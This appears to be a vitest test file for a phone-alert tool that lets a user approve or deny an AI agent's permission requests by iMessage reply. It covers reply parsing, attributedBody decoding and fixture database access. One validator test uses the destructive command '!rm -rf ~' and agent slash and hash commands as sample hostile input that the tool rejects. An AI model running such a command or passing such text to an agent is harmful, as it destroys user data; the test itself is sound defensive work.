    await expect(h.alerts.checkReplies()).resolves.toMatchObject({ state: "no-access", detail: expect.stringMatching(/Full Disk Access/) });
    h.alerts.sessionStatus(h.list[0], "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    await waitFor(() => h.sent.length > 0);
    expect(h.sent[0].text).not.toMatch(/Reply/);
    expect(h.logs.some((l) => l.startsWith("phone alerts: reading replies:"))).toBe(true);
  });

  it("a development build reads nothing: no replies source, and it says so", () => {
    const h = harness({ phone: { replies: true }, replies: null });
    expect(h.alerts.status().replies.state).toBe("dev");
  });

  it("decodes attributedBody, short and long", () => {
    expect(attributedText(typedstream("K4 1").toString("hex"))).toBe("K4 1");
    const long = `K4 ${"é".repeat(150)}`;
    expect(attributedText(typedstream(long).toString("hex"))).toBe(long);
    expect(attributedText(null)).toBeNull();
    expect(attributedText("00ff")).toBeNull();
  });

  it("reads a fixture database, never the real one", () => {
    expect(CHAT_DB.startsWith(process.env.HOME!)).toBe(true); // the test home, not ~
    expect(new ChatDbError("no-access", "x").problem).toBe("no-access");
  });
});

describe("reply words", () => {
  it("takes a code first or an answer then a code; anything else isn't a reply", () => {
    expect(parseReply("K4 1")).toEqual({ code: "K4", action: "allow" });
    expect(parseReply("#k4: 2")).toEqual({ code: "K4", action: "deny" });
    expect(parseReply("1 #K4")).toEqual({ code: "K4", action: "allow" });
    expect(parseReply("deny K4")).toEqual({ code: "K4", action: "deny" });
    expect(parseReply("K4 run it again")).toEqual({ code: "K4", action: "text", text: "run it again" });
    expect(parseReply("K4")).toBeNull();
    expect(parseReply("1")).toBeNull();
    expect(parseReply("B8 1")).toBeNull(); // not a code Mockingbird makes
    expect(parseReply("Mockingbird: “x” needs permission: Bash. Reply K4 1 to allow once")).toBeNull();
    expect(parseReply(`K4 ${"x".repeat(600)}`)).toBeNull();
  });

  it("refuses text an agent would read as a command", () => {
    expect(replyTextProblem("!rm -rf ~")).toMatch(/can't start with !/);
    expect(replyTextProblem("/permissions")).toMatch(/can't start with \//);
    expect(replyTextProblem("#remember this")).toMatch(/can't start with #/);
    expect(replyTextProblem("   ")).toBe("the message is empty");
    expect(replyTextProblem("run the tests")).toBeNull();
  });
});
